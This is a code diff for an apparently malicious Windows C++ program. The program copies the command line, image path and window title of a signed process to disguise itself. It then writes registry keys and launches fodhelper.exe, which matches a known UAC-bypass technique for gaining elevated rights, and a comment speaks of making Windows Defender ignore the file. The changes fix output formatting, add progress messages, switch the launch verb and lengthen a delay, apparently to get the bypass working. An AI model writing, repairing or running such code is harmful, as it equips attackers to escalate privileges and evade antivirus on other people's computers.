@@ -18,7 +18,7 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
       fprintf(stderr, "[-] No signed process found to impersonate.\n");
       return 1;
     }
-    printf("[+] Selected process: %ws (PID %lu)\n\n", target.exeName.c_str(), target.pid);
+    printf("[+] Selected process: %ls (PID %lu)\n\n", target.exeName.c_str(), target.pid);
 
     // Read info from the target.
     ProcessStrings info;
@@ -28,9 +28,10 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     }
 
     printf("[*] Read from target process:\n");
-    printf("    CommandLine   : %ws\n", info.commandLine.c_str());
-    printf("    ImagePathName : %ws\n", info.imagePathName.c_str());
-    printf("    WindowTitle   : %ws\n\n", info.windowTitle.c_str());
+    printf("    CommandLine   : %ls\n", info.commandLine.c_str());
+    printf("    ImagePathName : %ls\n", info.imagePathName.c_str());
+    printf("    WindowTitle   : %ls\n\n", info.windowTitle.c_str());
+    fflush(stdout);
 
     // Apply to ourselves.
     ApplyToCurrentProcess(info);
@@ -66,11 +67,13 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                      L"");
     
     
-    printf("here");
+    printf("[*] Writing registry keys...\n"); fflush(stdout);
     // Start fodhelper.exe with "runas" verb
-    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\fodhelper.exe", NULL,
+    printf("[*] Launching fodhelper.exe...\n"); fflush(stdout);
+    ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\fodhelper.exe", NULL,
                   NULL, SW_SHOWNORMAL);
-    Sleep(1000);
+    Sleep(2000);
+    printf("[+] Done.\n"); fflush(stdout);
   } else {
     if (IsDefenderRunning()) {
       // make window defender ignore this file at all cost
